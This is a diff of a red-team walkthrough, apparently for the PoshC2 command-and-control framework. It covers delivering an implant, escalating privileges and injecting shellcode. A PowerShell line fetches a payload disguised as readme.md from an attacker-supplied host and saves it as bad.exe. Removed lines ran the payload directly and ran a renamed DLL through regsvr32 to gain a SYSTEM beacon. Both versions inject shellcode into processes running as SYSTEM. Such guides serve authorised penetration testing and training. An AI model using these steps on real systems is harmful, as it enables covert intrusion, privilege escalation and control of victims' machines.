@@ -62,10 +62,12 @@ show-hosted-files
 
 For testing lets downloading using powershell on victim machine using a basic user
 ```powershell
-iwr -uri http://<YouripOrDomian>/en-us/readme.md -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
+iwr -uri http://<YourIP>/en-us/readme.md -outfile C:\windows\temp\bad.exe
 ```
 
-Interact with implant by typing `1` in ImplantHandler
+Just to be safe, find the file in Explorer, right-click, and run as administrator.
+
+Interact with implant by typing the number ID in ImplantHandler
 
 # User Escalation
 
@@ -73,45 +75,19 @@ Check for running process
 ```ps 
 ps
 ```
-> As a basic user you'll only be able to see anything ran under your own context. 
 
 Lets escalate to system through execution  
 
-Upload a the dll to the machine 
-```ps
-> upload-file 
-> Sharp_v4_x64.dll
-> location C:\windows\temp\updater.dll 
-```
-
-Execute dll using local windows binaries 
-```ps
-sharpps regsvr32 C:\windows\temp\updater.dll
-``` 
-> For more on native window binaries look [here](https://lolbas-project.github.io/)
-
-After execution you should see a system level beacon return in ImplantHandler  
-
-Once you are system you can Enumerate for other users on the box with domain access. 
-```ps
-ps
-```
-
-Search for any user process being ran as SYSTEM, to inject into.
+Search for any processes being ran as SYSTEM, to inject into.
 
 ```ps
 inject-shellcode <PID> 
 ```
 ```ps
-Sharp_v4_Shellcode.dll
+Sharp_x64_Shellcode.bin
 ```
 
 Checking your ImplantHandler you should see a new beacon running in the context of said user.
-
-As a domain user you can now run domain level commands, you can check your groups and privileges.
-``` 
-sharpps net user <domain username>
-```
 
 # Persistence and Scripting 
 
